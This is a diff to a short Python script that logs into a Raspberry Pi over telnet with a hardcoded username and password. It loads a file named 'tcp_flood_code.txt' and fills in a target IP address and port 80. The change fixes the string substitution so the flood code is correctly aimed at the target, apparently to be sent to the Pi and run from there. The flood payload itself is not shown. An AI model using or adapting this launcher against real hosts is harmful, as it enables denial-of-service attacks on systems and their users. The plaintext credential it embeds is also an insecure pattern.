@@ -2,7 +2,7 @@ import telnetlib
 import time
 from locale import atoi
 
-HOST = "192.168.1.10"
+HOST = "192.168.100.8"
 user = "pi"
 password = "Ciumcium"
 
@@ -14,11 +14,12 @@ if password:
     tn.read_until(b"Password: ")
     tn.write(password.encode('ascii') + b"\n")
 file = open('tcp_flood_code.txt', 'r')
-str1 = file.read()
-str1.replace('destination_ip', '192.168.1.24')
-str1.replace('destination_port', '80')
+strr = file.read()
+newstr = strr.replace("destination_ip", '192.168.100.6')
+str1 = newstr.replace('destination_port', '80')
 
-str1.replace('', '101')
+print(str1)
+# str1.replace('', '101')
 file.close()
 
 bfile = bytes(str1.encode())
